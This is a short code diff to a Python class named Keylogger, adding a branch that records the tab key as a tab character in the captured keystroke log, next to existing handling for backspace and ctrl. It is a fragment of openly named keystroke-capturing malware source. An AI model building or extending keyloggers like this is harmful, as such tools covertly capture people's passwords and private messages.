@@ -133,6 +133,8 @@ class Keylogger:
 			elif key == key.backspace: self.log += ''
 			# if person presses control key
 			elif key == key.ctrl: self.log += ' ctrl+'
+			# if person presses tab
+			elif key == key.tab: self.log += '\t'
 			else:
 				self.log += str(key)
 
